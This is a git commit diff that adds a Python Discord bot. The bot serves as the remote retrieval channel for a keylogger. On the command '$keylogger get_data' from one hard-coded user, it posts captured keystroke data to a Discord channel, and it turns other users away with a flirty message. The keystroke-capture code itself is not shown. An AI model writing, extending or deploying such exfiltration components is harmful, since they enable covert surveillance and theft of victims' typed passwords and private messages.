f159f1a68cddae744ea26170fc0583bb241f7af2
Sumit Sharma <84061534+Su-nlight@users.noreply.github.com>
2024-07-22 17:06:43 +0530

    Update discord_bot.py

---
+++ discord_bot.py
@@ -0,0 +1,30 @@
+import discord
+from dotenv import load_dotenv
+import os
+
+class DiscordBot:
+    def __init__(self, data_obj):
+        load_dotenv()
+
+        intents = discord.Intents.default()
+        intents.message_content = True
+
+        client = discord.Client(intents=intents)
+
+        @client.event
+        async def on_ready():
+            print(f'We have logged in as {client.user}')
+
+        @client.event
+        async def on_message(message):
+            if message.author == client.user:
+                return
+
+            if message.content.startswith('$keylogger get_data'):
+                if str(message.author)=='async_sunlight':
+                    await message.channel.send(f"New logged data is : ```{data_obj()}```")
+                else:
+                    await message.channel.send("this is not for you love 😘")
+
+        client.run(str(os.getenv('TOKEN')))
+
